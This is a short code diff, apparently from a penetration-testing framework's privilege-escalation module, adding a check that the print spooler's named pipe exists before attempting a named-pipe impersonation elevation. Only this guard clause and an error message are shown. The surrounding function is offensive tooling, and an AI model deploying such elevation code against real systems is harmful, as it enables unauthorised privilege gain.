@@ -32,6 +32,10 @@ DWORD elevate_via_namedpipe_printspooler(Remote* remote, Packet* packet)
 	PRIV_POST_IMPERSONATION PostImpersonation;
 
 	do {
+		if (!is_pipe_exists(L"\\\\.\\pipe\\spoolss")) {
+			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: \\pipe\\spoolss is not listenning.");
+		}
+
 		hNtdll = GetModuleHandleA("ntdll");
 		if (hNtdll == NULL) {
 			BREAK_ON_ERROR("[ELEVATE] elevate_via_namedpipe_printspooler: Failed to resolve RtlGetVersion");
